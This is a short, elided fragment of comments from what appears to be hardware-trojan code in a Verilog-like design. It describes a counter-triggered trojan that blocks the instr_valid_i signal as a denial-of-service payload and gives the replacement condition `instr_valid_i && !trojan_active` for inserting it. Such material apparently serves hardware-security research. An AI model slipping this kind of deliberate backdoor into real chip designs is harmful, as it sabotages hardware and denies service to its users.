 ...
 * 
 * Description:
 *   Disables operations by blocking instr_valid_i control signal
 *   
 * Trigger: Counter on instr_valid_i
 * Payload: Block instr_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block instr_valid_i when trojan is active
//
// IMPORTANT: instr_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (instr_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: instr_valid_i && 0 = 0 (always false)
//   All operations controlled by instr_valid_i are blocked
